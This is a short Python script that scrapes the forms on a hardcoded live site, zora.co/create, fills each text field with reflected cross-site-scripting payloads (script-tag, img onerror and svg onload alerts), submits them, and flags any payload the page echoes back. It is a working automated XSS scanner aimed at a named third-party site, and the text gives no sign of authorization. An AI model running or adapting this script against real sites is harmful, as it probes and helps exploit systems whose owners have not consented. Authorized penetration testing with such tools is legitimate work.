import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import sys

# Zora.co-specific: scan parameters on post creation, description, etc.
TARGET_URL = "https://zora.co/create"

# Default payloads (edit/add your own in payloads.txt)
DEFAULT_PAYLOADS = [
    "<script>alert('XSS1')</script>",
    "\"><script>alert('XSS2')</script>",
    "<img src=x onerror=alert('XSS3')>",
    "<svg/onload=alert('XSS4')>"
]

def load_payloads(file_path="payloads.txt"):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return DEFAULT_PAYLOADS

def extract_forms(url):
    res = requests.get(url)
    soup = BeautifulSoup(res.content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        type_ = input_tag.attrs.get("type", "text")
        value = input_tag.attrs.get("value", "")
        inputs.append({"name": name, "type": type_, "value": value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = payload
        data[input["name"]] = input["value"]
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    return requests.get(target_url, params=data)

def scan_xss(url):
    print(f"[!] Scanning {url}")
    forms = extract_forms(url)
    print(f"[+] Found {len(forms)} forms.")
    payloads = load_payloads()
    for form in forms:
        details = get_form_details(form)
        for payload in payloads:
            response = submit_form(details, url, payload)
            if payload in response.text:
                print(f"[!!!] XSS vulnerability detected with payload: {payload}")
            else:
                print(f"[ ] Tested payload: {payload}")

if __name__ == "__main__":
    scan_xss(TARGET_URL)
